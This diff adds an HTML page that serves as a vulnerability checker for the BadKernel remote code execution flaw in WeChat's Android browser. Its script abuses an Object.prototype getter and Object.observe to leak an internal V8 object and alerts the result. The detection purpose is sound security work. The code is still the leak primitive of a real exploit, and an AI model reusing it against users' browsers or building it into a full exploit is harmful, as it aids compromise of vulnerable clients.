@@ -1,0 +1,19 @@
+<html>
+<head>
+<meta charset="utf-8">
+<title>BadKernel验证demo</title> 
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=53391778" charset="UTF-8"></script>        
+</head>
+    <body>
+        BadKernel微信远程任意代码执行漏洞检测：弹出object则存在漏洞，undefined则不存在漏洞。（仅适用于微信安卓版）
+<script>
+	var kMessages;
+	Object.prototype.__defineGetter__("observe_accept_invalid",function(){kMessages=this});
+	try{
+		Object.observe({},function(){},1)
+	}catch(e){}
+	delete Object.prototype["observe_accept_invalid"];
+	alert(kMessages);
+</script>
+    </body>
+</html>    
